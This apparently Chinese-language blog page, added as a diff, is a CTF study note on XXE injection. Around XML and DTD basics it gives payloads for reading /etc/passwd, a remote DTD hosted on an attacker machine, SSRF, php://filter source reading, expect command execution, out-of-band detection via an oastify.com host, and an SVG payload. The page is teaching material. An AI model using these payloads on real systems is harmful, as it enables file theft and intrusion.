@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html class="dark" lang="zh-CH" prefix="og: http://ogp.me/ns# 
+fb: http://ogp.me/ns/fb#
+article: http://ogp.me/ns/article#">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="技术,生活">
+
+<title>XXE漏洞 || L1uxsn&#39;Blog</title>
+<link rel="icon" href="https://L1uxsn.github.ioimages/default-cover.webp" type="image/x-icon">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<meta property="og:title" content="XXE漏洞">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://l1uxsn.github.io/2026/07/13/XXE%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:image" content="">
+<meta property="og:site_name" content="L1uxsn&#39;Blog">
+<meta property="og:author" content="L1uxsn">
+
+  
+  
+  
+  <meta name="description" content="XXE漏洞前置知识：XMLXML是什么？XML是一种标记语言，XML指可扩展标记语言（EXtensensibleMarkupLanguage），把数据结构化后传输给对方让对方在结构化的数据中进行读取标签无意义且没有功能性，被设计为具有自我描述性：XML与HTML的区别？XML基本语法1.所有XML标签必须闭合">
+
+
+<script src="/js/wang.js"></script>
+
+<link rel="stylesheet" href="/css/wang.css">
+<script> console.log("Hello"); </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+<main>
+    <div id="agplAlert" style="z-index: 9999;">
+    <strong>请遵守AGPL 3.0协议</strong> 本主题已开源于<a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang">hexo-theme-wang</a>
+</div>
+    <header>
+    <nav>
+        <ul>
+            
+                <li>
+                    <a href="/" rel="noopener">
+                        
+                            <img src="/images/menu_ico/home.svg" class="menu-icon" alt="Home">
+                        
+                        Home
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/archives" rel="noopener">
+                        
+                            <img src="/images/menu_ico/archives.svg" class="menu-icon" alt="Archives">
+                        
+                        Archives
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/tags" rel="noopener">
+                        
+                            <img src="/images/menu_ico/tags.svg" class="menu-icon" alt="Tags">
+                        
+                        Tags
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/links" rel="noopener">
+                        
+                            <img src="/images/menu_ico/links.svg" class="menu-icon" alt="Links">
+                        
+                        Links
+                    </a>
+                </li>
+            
+            
+                <li>
+                    <button class="search-toggle-btn" aria-label="Open search">
+                        <img src="/images/menu_ico/search.svg" class="menu-icon" alt="search">
+                        Search
+                    </button>
+                </li>
+            
+        </ul>
+    </nav>
+</header>
+
+<script src="/js/header.js"></script>
+
+    
+<script src="/js/search.js"></script>
+
+
+    
+        <!-- 搜索模态框 -->
+        <div id="search-modal" class="search-modal">
+          <div class="search-modal-content">
+            <div class="search-header">
+              <form class="search-form" action="#" onsubmit="return false;">
+                <input type="text" id="search-input" placeholder="Search for articles" autocomplete="off">
+                <button type="button" class="search-close-btn" aria-label="Close">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                  </svg>
+                </button>
+              </form>
+            </div>
+            <div id="search-results"></div>
+          </div>
+        </div>
+
+        <script>
+        // 向全局对象添加i18n数据，以便search.js使用
+        window.WANG_THEME = window.WANG_THEME || {};
+        window.WANG_THEME.i18n = {
+          search: {
+            noResults: 'No results found',
+            loading: 'Loading...',
+            placeholder: 'Search for articles',
+            close: 'Close',
+            shortcut_tip: 'Press ESC to close',
+            toggle_search: 'Open search',
+            error_loading: 'Failed to load search data'
+          }
+        };
+        </script>
+    
+    <aside class="sidebar-container sidebar-left">
+    <div class="sidebar-bg">
+        <h2 class="site-title">L1uxsn'Blog</h2>
+        <img class="avatar avatar-round" src="/images/avatar.jpg" style="width:50px;" alt="网站头像">
+        <h2 class="site-author">L1uxsn</h2>
+        <h3 class="site-subtitle">分享技术和生活</h3>
+    </div>
+    <div class="sidebar-bg">
+        <ul class="social_links">
+            
+                <li>
+                    <a href="https://L1uxsn.github.io" aria-label="Github的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/github.svg" class="icon" alt="Github的图标"><p>Github</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="mailto:3586323056@qq.com" aria-label="Email的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/envelope.svg" class="icon" alt="Email的图标"><p>Email</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+</aside>
+<div class="post-container">
+  <article class="post">
+    <h1 class="post-title">XXE漏洞</h1>
+
+    <div class="post-meta">
+      <span class="post-date">Posted on <time datetime="2026-07-13T14:02:55.000Z">2026-07-13</time></span>
+      
+        <span class="post-categories">
+          Category：<a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+        </span>
+      
+      
+        <span class="post-updated">
+          Last Updated <time datetime="2026-07-17T17:37:06.256Z">2026-07-18</time>
+        </span>
+      
+      <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
+    </div>
+    <div class="post-content">
+      <h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="前置知识：XML"><a href="#前置知识：XML" class="headerlink" title="前置知识：XML"></a>前置知识：XML</h2><h3 id="XML是什么？"><a href="#XML是什么？" class="headerlink" title="XML是什么？"></a>XML是什么？</h3><p><strong>XML是一种标记语言，XML指可扩展标记语言（EXtensensible Markup Language），把数据结构化后传输给对方让对方在结构化的数据中进行读取</strong></p>
+<p>标签无意义且没有功能性，被设计为具有自我描述性：</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/1.png"></p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/2.png"></p>
+<h3 id="XML与HTML的区别？"><a href="#XML与HTML的区别？" class="headerlink" title="XML与HTML的区别？"></a>XML与HTML的区别？</h3><p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/3.png"></p>
+<h3 id="XML基本语法"><a href="#XML基本语法" class="headerlink" title="XML基本语法"></a>XML基本语法</h3><ul>
+<li><p>1.所有XML标签必须闭合</p>
+</li>
+<li><p>2.XML必须进行正确的嵌套</p>
+</li>
+<li><p>3.标签对大小写敏感</p>
+</li>
+<li><p>4.XML文档必须要有根元素（所有其他元素的父元素）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;root&gt;</span><br><span class="line">	&lt;student&gt;</span><br><span class="line">		&lt;name&gt;......&lt;/name&gt;</span><br><span class="line">	&lt;/student&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>5.没有缩进要求，建议首行缩进</p>
+</li>
+<li><p>6.头声明可有可无（定义XML版本和所使用的编码），建议写</p>
+<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code></p>
+</li>
+<li><p>7.<strong>实体引用：在xml中，一些字符拥有特殊的意义。</strong></p>
+<p>如果把字符 “&lt;” 放在XML元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p>
+<p><code>&lt;message&gt;if salary &lt; 11000 then &lt;/message&gt;</code>   报错！！！</p>
+</li>
+</ul>
+<p>为了避免这个错误，会使用实体引用来代替 “&lt;” 字符</p>
+<p>​    <code>&lt;message&gt;if salary &amp;lt; 11000 then &lt;/message&gt;</code>  </p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/4.png"></p>
+<h3 id="使用php解析xml文档"><a href="#使用php解析xml文档" class="headerlink" title="使用php解析xml文档"></a>使用php解析xml文档</h3><ul>
+<li>1.<strong>php页面调用xml</strong></li>
+</ul>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/5.png"></p>
+<ul>
+<li><p>2.**使用DOMDocument读取XML文档 **</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/6.png"></p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/7.png"></p>
+</li>
+</ul>
+<p>指定读取：</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/8.png"></p>
+<ul>
+<li><p><strong>混合读取：</strong></p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/9.png"></p>
+</li>
+</ul>
+<h3 id="DTD声明（Document-Type-Definition）"><a href="#DTD声明（Document-Type-Definition）" class="headerlink" title="DTD声明（Document Type Definition）"></a>DTD声明（Document Type Definition）</h3><p>(文档类型定义可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构)</p>
+<ul>
+<li>内部的声明：（没有DTD时xml文件可以随意定义添加标签）</li>
+</ul>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/10.png"></p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/11.png"></p>
+<ul>
+<li><p>2.外部引入DTD文件：</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/12.png"></p>
+</li>
+</ul>
+<h2 id="XML几种实体介绍"><a href="#XML几种实体介绍" class="headerlink" title="XML几种实体介绍"></a>XML几种实体介绍</h2><h4 id="什么是实体？"><a href="#什么是实体？" class="headerlink" title="什么是实体？"></a>什么是实体？</h4><p><strong>实体是对数据的引用；根据实体种类的不同，XML解析器将使用实体的替代文本或者外部文档的内容来替代实体引用（使用实体可以去掉字符的含义）</strong></p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/13.png"></p>
+<h4 id="实体演示："><a href="#实体演示：" class="headerlink" title="实体演示："></a>实体演示：</h4><p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/14.png"></p>
+<p><strong>实体可迭代使用</strong></p>
+<p><strong>XXE漏洞产生主要原因是外部调用文件</strong></p>
+<h4 id="参数实体："><a href="#参数实体：" class="headerlink" title="参数实体："></a>参数实体：</h4><p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/15.png"></p>
+<h3 id="XXE漏洞成因介绍"><a href="#XXE漏洞成因介绍" class="headerlink" title="XXE漏洞成因介绍"></a>XXE漏洞成因介绍</h3><p><strong>XXE(XML External Entity Inject)全称 XML外部实体注入</strong></p>
+<h4 id="XXE漏洞演示："><a href="#XXE漏洞演示：" class="headerlink" title="XXE漏洞演示："></a>XXE漏洞演示：</h4><p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/16.png"></p>
+<p>利用file伪协议读取 &#x2F;etc&#x2F;passwd</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/17.png"></p>
+<h4 id="不同程序支持的伪协议："><a href="#不同程序支持的伪协议：" class="headerlink" title="不同程序支持的伪协议："></a>不同程序支持的伪协议：</h4><p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/18.png"></p>
+<h3 id="XXE使用外部实体读取文件："><a href="#XXE使用外部实体读取文件：" class="headerlink" title="XXE使用外部实体读取文件："></a>XXE使用外部实体读取文件：</h3><p>列题：</p>
+<p>进入题目发现是一个登录框，输入成功或者失败都会回显出用户名</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/19.png"></p>
+<p>此时查看源码发现是XML格式的提交</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/20.png"></p>
+<p>可以利用用户名会回显这点外部实体读取文件</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/21.png"></p>
+<h3 id="参数实体及http伪协议XXE利用"><a href="#参数实体及http伪协议XXE利用" class="headerlink" title="参数实体及http伪协议XXE利用"></a>参数实体及http伪协议XXE利用</h3><p>此时对伪协议做了过滤，无法读取目标文件</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/22.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此时可尝试命名实体，（命名实体只能在DTD文档内使用）在kali中创建 1.dtd文件（内容为：&lt;!DOCTYPE root [&lt;!ENTITY ben SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;）,再 ip add获取kali的ip，python3 -m http.server 80 开启http服务，再远程访问该kali上的1.dtd文件，利用参数实体</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/23.png"></p>
+<h4 id="利用XXE进行SSRF利用："><a href="#利用XXE进行SSRF利用：" class="headerlink" title="利用XXE进行SSRF利用："></a>利用XXE进行SSRF利用：</h4><p>（<code>http://10.1.2.3</code>为内网ip地址）</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/24.png"></p>
+<p>获取flag</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/25.png"></p>
+<h3 id="XXE利用php伪协议读取文件"><a href="#XXE利用php伪协议读取文件" class="headerlink" title="XXE利用php伪协议读取文件"></a>XXE利用php伪协议读取文件</h3><p>想要读取源码index.php,如果直接读取的话会被页面解析掉，导致看不到源码，所以可以使用base64编码后回显，再base64解码的方式得到源码，使用php:&#x2F;&#x2F;filter</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/26.png"></p>
+<h3 id="利用expect扩展进行命令执行"><a href="#利用expect扩展进行命令执行" class="headerlink" title="利用expect扩展进行命令执行"></a>利用expect扩展进行命令执行</h3><p>expect协议 处理交互式的流</p>
+<p>expect伪协议里提交命令（前提：PHP安装expect扩展）</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/27.png"></p>
+<p><strong>注意：expect伪协议里出现以下七个字符会报错</strong></p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/28.png"></p>
+<h3 id="无回显XXE带外数据"><a href="#无回显XXE带外数据" class="headerlink" title="无回显XXE带外数据"></a>无回显XXE带外数据</h3><ul>
+<li><p>1.查看漏洞:</p>
+<p>法一：DNSlog查看漏洞</p>
+<p><code>&lt;!DOCTYPE root [&lt;!ENTITY % xxe SYSTEM &quot;http://vzyhtmj4aswbu8q21dusvheo3f96xxlm.oastify.com&quot;&gt;] %xxe&gt;</code></p>
+</li>
+</ul>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/29.png"></p>
+<p>​	法二：nc查看漏洞</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/30.png"></p>
+<ul>
+<li><p>2.带外数据</p>
+<p>在kali里写入一个1.dtd文件，同时监听端口（7777）</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/31.png"></p>
+</li>
+</ul>
+<p>​	让目标网站去读取kali里的1.dtd文件</p>
+<p>​	<img src="/img/XXE%E6%BC%8F%E6%B4%9E/32.png"></p>
+<h3 id="Xinclude"><a href="#Xinclude" class="headerlink" title="Xinclude"></a>Xinclude</h3><p><strong>xinclude可以包含一个XML文件，调用一个写好的XML文件</strong></p>
+<p>基本语法：</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/33.png"></p>
+<p>实列：</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/34.png"></p>
+<p>与php文件包含区别：</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/35.png"></p>
+<p>代码解释：</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/36.png"></p>
+<p>靶场操作：</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/37.png"></p>
+<h3 id="利用SVG进行XXE漏洞利用"><a href="#利用SVG进行XXE漏洞利用" class="headerlink" title="利用SVG进行XXE漏洞利用"></a>利用SVG进行XXE漏洞利用</h3><p>SVG文件介绍： </p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/38.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;          ——固定格式</span><br><span class="line">&lt;!DOCTYPE svg[&lt;!ENTITY xxe SYSTEM &quot;file:///etc.passwd&gt;]&gt;    ——payload</span><br><span class="line">&lt;svg width=&quot;500px&quot; height=&quot;100px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;        ——固定格式    xmlns:xlink=&quot;http:///www.w.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;      ——固定格式</span><br><span class="line">&lt;text font-family=&quot;Verdana&quot; font-size=&quot;16&quot; x=&quot;10&quot; y=&quot;40&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;     ——回显字体以及位置设置</span><br></pre></td></tr></table></figure>
+
+<p>结果显示：</p>
+<p><img src="/img/XXE%E6%BC%8F%E6%B4%9E/39.png"></p>
+
+    </div>
+  </article>
+  <div class="ccbyncsa">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="copyright">
+                    <div class="author">
+                        <p>Author</p>
+                        <p>L1uxsn</p>
+                    </div>
+                    <div class="title">
+                        <p>Title</p>
+                        <p>XXE漏洞</p>
+                    </div>
+                        <div class="publish">
+                            <p>Published</p>
+                            <p>2026-07-13</p>
+                        </div>
+                    <div class="ccbyncsa-icon">
+                        <p>CC-BY-NC-SA 4.0</p>
+                        <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                        <p class="ccbyncsa-icon-imgs" style="display: flex;">
+                        <img src="/images/cc.svg" alt="cc">
+                        <img src="/images/by.svg" alt="by">
+                        <img src="/images/nc.svg" alt="nc">
+                        <img src="/images/sa.svg" alt="sa">
+                        </p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+  <nav class="post-pagination">
+    
+      <div class="post-prev">
+        <span class="nav-label">Previous Post</span>
+        <a href="/2026/07/12/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/">SQL注入相关</a>
+      </div>
+    
+    
+      <div class="post-next">
+        <span class="nav-label">Next Post</span>
+        <a href="/2026/07/14/twig%E4%B8%8Esmarty%E6%A8%A1%E6%9D%BF%E7%9A%84ssti/">twig与smarty模板的ssti</a>
+      </div>
+    
+  </nav>
+  
+<link href="https://unpkg.com/@waline/client@v3/dist/waline.css" rel="stylesheet">
+<div class="comments-container night">
+    <div id="waline"></div>
+    <script type="module">
+      import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js';
+      init({
+        el: '#waline',
+        serverURL: '',
+        dark: 'html.dark',
+        pageview: true,
+        commentClassName: 'prose prose-neutral dark:prose-invert min-w-0 max-w-none',
+        lang: 'zh-CH', //
+        avatar: 'mm', //
+        meta: ['nick', 'mail'], //
+        pageSize: 10, //
+        visitor: true, //
+        commentCount: true, //
+        requiredFields: ['nick', 'mail'], //
+      });
+    </script>
+    </div>
+
+
+</div>
+
+<script src="/js/copy.js"></script>
+
+<aside class="sidebar-container sidebar-right">
+    <div class="sidebar-bg">
+        <p id="date"></p>
+<script>
+  function updateDate() {
+    var now = new Date();
+    var dateString = now.toISOString().slice(0, 10);
+    document.getElementById('date').textContent = dateString;
+  }
+
+  window.addEventListener('load', function() {
+    updateDate();
+    // 更新频率为每5分钟更新一次，减少不必要的更新
+    setInterval(updateDate, 300000);
+  });
+</script>
+        <span id="clock" role="timer" aria-live="polite"></span>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const clockElement = document.getElementById('clock');
+    let timerInterval;
+
+    // 格式化时间函数
+    function formatTime(unit) {
+      return unit < 10 ? '0' + unit : unit;
+    }
+
+    // 更新时钟 - 包含秒
+    function updateClock() {
+      const now = new Date();
+      const hours = formatTime(now.getHours());
+      const minutes = formatTime(now.getMinutes());
+      const seconds = formatTime(now.getSeconds());
+      clockElement.textContent = `${hours}:${minutes}:${seconds}`;
+    }
+
+    // 初始化时钟
+    function startClock() {
+      // 立即更新一次时间
+      updateClock();
+      // 每秒更新一次
+      timerInterval = setInterval(updateClock, 1000);
+    }
+
+    // 页面可见性变化时的优化
+    document.addEventListener('visibilitychange', function() {
+      if (document.hidden) {
+        // 页面不可见时停止更新
+        clearInterval(timerInterval);
+      } else {
+        // 页面重新可见时，重新开始
+        clearInterval(timerInterval);
+        startClock();
+      }
+    });
+
+    // 启动时钟
+    startClock();
+  });
+</script>
+
+
+    </div>
+    <div class="sidebar-bg">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">XXE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9AXML"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识：XML</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.1.1.</span> <span class="toc-text">XML是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E4%B8%8EHTML%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">1.1.2.</span> <span class="toc-text">XML与HTML的区别？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">1.1.3.</span> <span class="toc-text">XML基本语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8php%E8%A7%A3%E6%9E%90xml%E6%96%87%E6%A1%A3"><span class="toc-number">1.1.4.</span> <span class="toc-text">使用php解析xml文档</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD%E5%A3%B0%E6%98%8E%EF%BC%88Document-Type-Definition%EF%BC%89"><span class="toc-number">1.1.5.</span> <span class="toc-text">DTD声明（Document Type Definition）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML%E5%87%A0%E7%A7%8D%E5%AE%9E%E4%BD%93%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.</span> <span class="toc-text">XML几种实体介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%AE%9E%E4%BD%93%EF%BC%9F"><span class="toc-number">1.2.1.</span> <span class="toc-text">什么是实体？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93%E6%BC%94%E7%A4%BA%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">实体演示：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">参数实体：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.4.</span> <span class="toc-text">XXE漏洞成因介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA%EF%BC%9A"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">XXE漏洞演示：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E7%A8%8B%E5%BA%8F%E6%94%AF%E6%8C%81%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">不同程序支持的伪协议：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E4%BD%BF%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.2.5.</span> <span class="toc-text">XXE使用外部实体读取文件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E5%8F%8Ahttp%E4%BC%AA%E5%8D%8F%E8%AE%AEXXE%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.6.</span> <span class="toc-text">参数实体及http伪协议XXE利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8XXE%E8%BF%9B%E8%A1%8CSSRF%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">利用XXE进行SSRF利用：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.7.</span> <span class="toc-text">XXE利用php伪协议读取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8expect%E6%89%A9%E5%B1%95%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.8.</span> <span class="toc-text">利用expect扩展进行命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BEXXE%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE"><span class="toc-number">1.2.9.</span> <span class="toc-text">无回显XXE带外数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xinclude"><span class="toc-number">1.2.10.</span> <span class="toc-text">Xinclude</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8SVG%E8%BF%9B%E8%A1%8CXXE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.11.</span> <span class="toc-text">利用SVG进行XXE漏洞利用</span></a></li></ol></li></ol></li></ol>
+    </div>
+    <div class="sidebar-bg">
+        <div class="card-tags">
+            
+                <a href="/tags/CTF/" class="tag" aria-label="标签: #CTF">#CTF</a>
+            
+                <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="tag" aria-label="标签: #Web安全">#Web安全</a>
+            
+                <a href="/tags/XXE/" class="tag" aria-label="标签: #XXE">#XXE</a>
+            
+        </div>
+    </div>
+    <div>
+        <div class="categories-list">
+            
+                <div class="category-item">
+                    <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" aria-label="分类: 网络安全">
+                        网络安全
+                        <span>(12)</span>
+                    </a>
+                </div>
+            
+        </div>
+    </div>
+</aside>
+
+    <!-- No categories available -->
+
+
+    <footer>
+    <span id="busuanzi_container_site_pv" style="display: inline;"></span>
+    <span>👁<span id="busuanzi_value_site_pv"></span></span>
+    <div class="padding border border-sub border-dotted fadein-right">
+        <span style="color:aliceblue">👤<span id="busuanzi_value_site_uv"></span></span>
+    </div>
+    <span>
+        Powered by <a target="_blank" rel="noopener" href="https://hexo.io" alt="Hexo">
+            <p class="hover-underline night" style="display: inline;">Hexo</p>
+        </a>
+        <p style="display: inline; color: red;">❤</p>
+        Built with <a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang" alt="Wang">
+            <p class="hover-underline night" style="display: inline;">Wang</p>
+        </a> Theme
+    </span>
+
+    <!-- 带图片的链接 -->
+    <div class="footer-links">
+        
+    </div>
+
+    <!-- 纯文本链接 -->
+    <div class="footer-text-links">
+        
+            
+                <a href="" target="_blank" rel="noopener">
+                    宏愿纵未了,奋斗总不太晚
+                </a>
+            
+        
+    </div>
+</footer>
+    
+<script src="/js/background.js"></script>
+    
+        
+<script src="/js/search.js"></script>
+    
+</main>
+</body>
+</html>
